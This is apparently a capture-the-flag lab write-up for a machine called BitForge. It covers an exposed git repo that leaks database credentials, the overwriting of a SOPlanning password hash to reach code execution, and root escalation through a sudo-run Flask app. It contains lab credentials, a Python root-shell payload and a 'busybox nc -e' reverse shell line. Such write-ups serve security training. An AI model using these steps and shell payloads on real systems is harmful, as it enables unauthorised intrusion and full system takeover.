# BitForge \[Inter]

## Report

SOPlanning running on `plan.bitforge.lab` is vulnerable to authenticated RCE. However, default creds of `admin:admin` do not work. A git repo is also publicly exposed which gives us database credentials. Passwords are stored as a SHA1 hash. To update this and set our own custom hash, we can set a new password by reading the documentation and structure of the service which describes the function used to generate the SHA1 hash or the demo data provides a default hash value that would probably be 'admin'. Update db with this new found hash, login and get reverse shell.

Intercept creds for user 'jack' via pspy and jack can run a flask application as sudo. Edit the corresponding python file to become root.

## Cheatsheet

```
mysql --skip-ssl -h 192.168.106.186 -uBitForgeAdmin -pB1tForG3S0ftw4r3S0lutions
```

## Loot

### Enumeration

192.168.106.186

#### 80

#### bitforge.lab

login.php - Nothing

#### plan.bitforge.lab

Simple Online Planning v1.52.01

### Attack Vectors

.git exposed, retrieve database creds

{% embed url="https://github.com/theexploiters/CVE-2024-27115-Exploit" %}

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption><p>Extract default hash from fresh install, replace it with existing hash as we cannot crack it</p></figcaption></figure>

<div align="left"><figure><img src="../../../.gitbook/assets/image (5) (1).png" alt=""><figcaption><p>includes/class_user.inc shows how password hash is created, some char prepended and appended so normal way of creating sha-1 wont work</p></figcaption></figure></div>

### PrivEsc

<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption><p>Intercept creds for user 'jack'</p></figcaption></figure>

```bash
User jack may run the following commands on bitforge:
    (root) NOPASSWD: /usr/bin/flask_password_changer

jack@BitForge:/opt/password_change_app$ cat /usr/bin/flask_password_changer
#!/bin/bash
cd /opt/password_change_app 
/usr/local/bin/flask run --host 127.0.0.1 --port 9000 --no-debug

jack@BitForge:/opt/password_change_app$ ls -la
total 24
drwxr-xr-x 4 jack jack 4096 Oct  2 06:43 .
drwxr-xr-x 4 root root 4096 Jan 16  2025 ..
-rw-rw-r-- 1 jack jack   49 Oct  2 06:43 app.py


import os
os.setuid(0)
os.system("/bin/bash -p")
OR
os.system('busybox nc -e $IP /bin/sh'
```

### Creds

#### Database

`$dbName = 'bitforge_customer_db'`

`BitForgeAdmin:B1tForG3S0ftw4r3S0lutions`

#### SOPlanning

`admin:df5b909019c9b1659e86e0d6bf8da81d6fa3499e` \[SHA-1, didn't work]

change existing hash to match default creds of `admin:admin`

#### Lateral

`jack:j4cKF0rg3@445`

### Proof
